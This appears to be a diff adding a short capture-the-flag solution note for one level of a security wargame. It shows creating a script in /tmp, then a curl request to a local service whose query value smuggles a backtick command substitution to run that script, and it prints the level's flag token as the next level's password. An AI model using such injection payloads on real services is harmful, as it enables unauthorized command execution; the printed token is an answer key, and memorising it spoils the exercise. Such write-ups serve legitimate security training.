@@ -1,0 +1,10 @@
+create file /tmp/SCRIPT
+
+$>chmod 777 /tmp/SCRIPT
+$>curl localhost:4646?x='`/*/SCRIPT`'
+
+$cat /tmp/toto
+
+Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
+
+password lvl13 : g1qKMiRpXf53AWhDaU7FEkczr
